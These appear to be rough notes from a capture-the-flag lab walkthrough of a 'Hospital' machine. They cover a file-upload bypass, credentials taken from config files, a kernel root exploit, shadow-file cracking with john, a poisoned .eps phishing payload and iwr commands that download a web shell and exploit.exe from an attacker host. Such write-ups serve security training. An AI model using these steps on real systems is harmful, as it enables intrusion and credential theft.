http://10.10.11.241:8080/ ==> Different Web Page

Theres a login/register
You can also submit files to the server, may be some file upload stuff happening

When you upload files, they go into the http://10.10.11.241:8080/uploads/<filename>

Somehow, this box concerning its web section, acts like Linux: so we need to attack it like its a linux machine.

To bypass this file upload, we simple need to change the file ending to .phar

Inside the config.php we got creds
{
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
}

mysql -h localhost -u root -p

This hashes deal with the 8080 port

Using the gameoverlay linux kernel enum exploit, we can gain a shell as root, once we are root, now we are in some kind of container
we can actually crack passwords inside the /etc/shadow

we will need a copy of /etc/passwd and /etc/shadow, then we can run:

unshadow passwd.txt shadow.txt > shadCreds.txt ==> makes format john can crack
john --wordlist=/usr/share/wordlists/rockyou.txt shadCreds.txt ==> cracks hashes

drwilliams@hospital.htb:qwe123!@# ==> ssh into webmaster

drwilliams:qwe123!@# ==> Login for https website!

drbrown@hospital.htb ==> user on a different section of the hospital network

Dear Lucy,

I wanted to remind you that the project for lighter, cheaper and
environmentally friendly needles is still ongoing ðŸ’‰. You are the one in
charge of providing me with the designs for these so that I can take
them to the 3D printing department and start producing them right away.
Please make the design in an ".eps" file format so that it can be well
visualized with GhostScript.

Best regards,
Chris Brown.

}

Main goal of the pwn is to give them a poisoned .eps file.
We can use a python script from github to generate a base template to then inject the common but effective b64 encoded payload into it, using another python script.

Instantly we get a shell as drBrown on the box and we can swipe the userflag
=========================================================

Viwing the bat file there is a possible password `chr!$br0wn`
Cannot seem to evilwin-rm into the box using drbrown.HOSPITAL:chr!$br0wn

Inside the windows system there are a few user folders:
	Administrator
	drbrown
	drbrown.HOSPITAL
	drwilliams
	drwilliams.HOSPITAL
	
User: xampp-dav-unsecure
Password: ppmax2011

We can write inside the root web directory in the https section of the website

iwr http://10.10.14.201:80/wolfy.php -outfile ./wolfy.php

We get can send a command to get a shell as administrator [UNINTENDED ROUTE]

iwr http://10.10.14.201:80/exploit.exe -outfile ./exploit.exe ==> download and save file
